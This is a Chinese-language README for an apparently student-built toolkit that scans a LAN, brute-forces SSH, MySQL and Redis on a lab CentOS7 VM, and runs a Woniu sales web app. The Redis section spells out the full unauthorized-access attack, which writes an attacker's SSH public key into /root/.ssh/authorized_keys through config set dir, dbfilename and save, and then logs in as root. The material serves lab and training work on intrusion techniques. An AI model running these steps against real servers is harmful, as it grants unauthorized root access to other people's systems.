# xiangmu_mytools

### 运行软件必备前提：

1.在虚拟机中打开centos7虚拟机
2.关闭防火墙
3.运行tomcat的蜗牛进销存项目，项目地址：cd /usr/apache-tomcat-9.0.88/bin
4.运行：./startup.sh
5.前端访问地址：http://[虚拟机ip]:8080/WoniuSales1.4/
6.运行redis,地址：cd /usr/local/redis-5.0.4/
7.运行(redis后台运行)：redis-server ./redis.conf

### 测试ssh连接：

```
ssh -i id_rsa root@[虚拟机ip地址]
```

(如果需要密码就是没有redis  ssh提权登录,需要从新配置公钥，新电脑运行也要重新配置公钥)

pycharm运行或者直接运行我的demo文件下的my_tools.exe文件

python主文件:**My_tools.py**

我的demo文件夹下的txt文件必须放在主目录,且不能删除(程序项目运行必备)

前置环境软件文件夹下war是蜗牛进销存tomcat的项目文件，woniusales.sql是数据库数据文件，user表中记录登录软件的用户名和密码

程序运行的数据库在本机的mysql上，
		如需修改，要进到项目主文件中修改mysql配置那几行代码，然后从新打包成exe
		打包命令： 

```
pyinstaller -F -i aaa.ico My_tools.py  
```



扫描区域网的功能暂时只能扫描蜗牛学院本地wifi网段(192.168.4.)下的所有ip和端口，如需扫描其他网段
需要在程序中修改后重新打包成exe运行

爆破服务器和3306和6379是爆破的centos7虚拟机的ip


redis配置本地公钥：
=================
#在windows的redis文件夹下执行如下命令：

```
redis-cli.exe -h [虚拟机ip地址] -p 6379
```

#设置公钥（window系统公钥在用户文件夹下的.ssh下的id_rsa.pub中）（linux在root目录下的.ssh文件夹中）
（如果没有需要提前生成公钥：ssh-keygen）

```
set mykey "\n\n公钥\n\n\n"
```

#修改存储路径

```
config set dir /root/.ssh
```

#修改文件名

```
config set dbfilename authorized_keys
```

#手动触发保存

```
save
```

#最后退出测试ssh：

```
ssh -i id_rsa root@[虚拟机ip]
```

